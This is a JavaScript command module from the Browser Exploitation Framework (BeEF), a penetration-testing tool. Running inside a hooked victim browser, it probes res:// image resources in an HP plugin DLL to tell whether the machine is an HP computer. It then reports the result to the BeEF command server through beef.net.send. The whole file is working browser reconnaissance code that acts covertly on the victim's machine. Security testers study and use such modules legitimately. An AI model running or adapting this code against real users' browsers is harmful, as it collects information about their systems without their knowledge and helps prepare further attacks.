//
// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var is_hp = new Array;
	var dom = document.createElement('b');

	parse_results = function() {
		var result = "false";
		if (is_hp.length) result = "true";
		beef.net.send("<%= @command_url %>", <%= @command_id %>, "is_hp="+result);
	};

	var fingerprints = new Array(
		new Array("warning","res://hpnetworkcheckplugin.dll/warning.jpg"),
		new Array("hpr_rgb","res://hpnetworkcheckplugin.dll/HPR_D_B_RGB_72_LG.png")
	);

	for (var i=0; i<fingerprints.length; i++) {
		var img = new Image;
		img.id = fingerprints[i][0];
		img.name = fingerprints[i][0];
		img.src = fingerprints[i][1];
		img.onload = function() { is_hp.push(this.id); dom.removeChild(this); }
		dom.appendChild(img);
	}

	setTimeout('parse_results();', 2000);

});

